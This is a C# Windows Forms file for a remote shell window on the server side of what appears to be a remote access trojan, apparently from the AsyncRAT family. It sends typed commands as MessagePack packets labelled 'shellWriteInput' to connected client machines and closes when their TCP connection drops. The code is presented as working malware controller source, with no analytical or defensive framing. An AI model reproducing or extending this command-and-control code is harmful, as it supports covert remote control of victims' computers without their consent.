using System;
using System.Threading;
using System.Windows.Forms;
using Server.Connection;
using Server.MessagePack;

namespace Server.Forms
{
    public partial class FormShell : Form
    {
        public FormShell()
        {
            InitializeComponent();
        }

        public Form1 F { get; set; }
        internal Clients Client { get; set; }

        private void TextBox1_KeyDown(object sender, KeyEventArgs e)
        {
            if (Client != null)
                if (e.KeyData == Keys.Enter && !string.IsNullOrWhiteSpace(textBox1.Text))
                {
                    if (textBox1.Text == "cls".ToLower())
                    {
                        richTextBox1.Clear();
                        textBox1.Clear();
                    }

                    if (textBox1.Text == "exit".ToLower()) Close();
                    var msgpack = new MsgPack();
                    msgpack.ForcePathObject("Pac_ket").AsString = "shellWriteInput";
                    msgpack.ForcePathObject("WriteInput").AsString = textBox1.Text;
                    ThreadPool.QueueUserWorkItem(Client.Send, msgpack.Encode2Bytes());
                    textBox1.Clear();
                }
        }

        private void FormShell_FormClosed(object sender, FormClosedEventArgs e)
        {
            try
            {
                var msgpack = new MsgPack();
                msgpack.ForcePathObject("Pac_ket").AsString = "shellWriteInput";
                msgpack.ForcePathObject("WriteInput").AsString = "exit";
                ThreadPool.QueueUserWorkItem(Client.Send, msgpack.Encode2Bytes());
            }
            catch
            {
            }
        }

        private void Timer1_Tick(object sender, EventArgs e)
        {
            try
            {
                if (!Client.TcpClient.Connected) Close();
            }
            catch
            {
                Close();
            }
        }
    }
}